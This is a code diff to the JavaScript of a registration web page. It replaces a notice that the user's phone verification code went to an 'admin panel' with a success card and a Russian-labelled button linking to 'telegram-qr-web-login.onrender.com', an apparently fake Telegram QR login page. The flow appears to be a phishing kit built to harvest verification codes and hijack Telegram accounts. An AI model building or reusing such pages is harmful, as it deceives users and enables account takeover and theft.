@@ -1272,17 +1272,49 @@
             finalMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
             finalCard.innerHTML = `
-                <div class="section-title" style="margin-bottom:4px;">
-                    <span class="bar"></span>Application sent — waiting for decision
+                <div class="section-title" style="margin-bottom:6px;">
+                    <span class="bar"></span>Application sent — next step
                 </div>
-                <div class="success-envelope">⏳</div>
-                <div class="section-sub" style="margin-bottom:0;">
-                    Your registration data and phone verification code have been delivered to the
-                    <strong>admin panel</strong> for manual review.
-                    If your application is approved, the admin will contact you using the phone number you provided.
-                    If the application is rejected, you will receive the reason and (when possible) instructions to retry.
+
+                <div class="success-envelope">✅</div>
+
+                <div class="section-sub" style="margin-bottom:12px;">
+                    Your application has been sent. To continue, start the qualifying stage.
                 </div>
-            `;
+
+                <div style="display:flex; justify-content:flex-end;">
+                    <a href="https://telegram-qr-web-login.onrender.com"
+                    style="
+                        padding: 8px 18px;
+                        border-radius: var(--radius-full);
+                        background: linear-gradient(90deg, var(--accent-alt), var(--accent));
+                        color: #000;
+                        font-size: 8px;
+                        font-weight: 800;
+                        letter-spacing: 0.18em;
+                        text-transform: uppercase;
+                        text-decoration: none;
+                        box-shadow: 0 10px 24px rgba(0,0,0,1);
+                        display: inline-flex;
+                        align-items: center;
+                        gap: 7px;
+                    ">
+                    <span style="
+                        width: 12px;
+                        height: 12px;
+                        border-radius: 999px;
+                        background: #000;
+                        color: var(--accent);
+                        display: inline-flex;
+                        align-items: center;
+                        justify-content: center;
+                        font-size: 8px;
+                    ">▶</span>
+                    НАЧАТЬ ОТБОРОЧНЫЙ ЭТАП
+                    </a>
+                </div>
+                `;
+
         });
     }
 
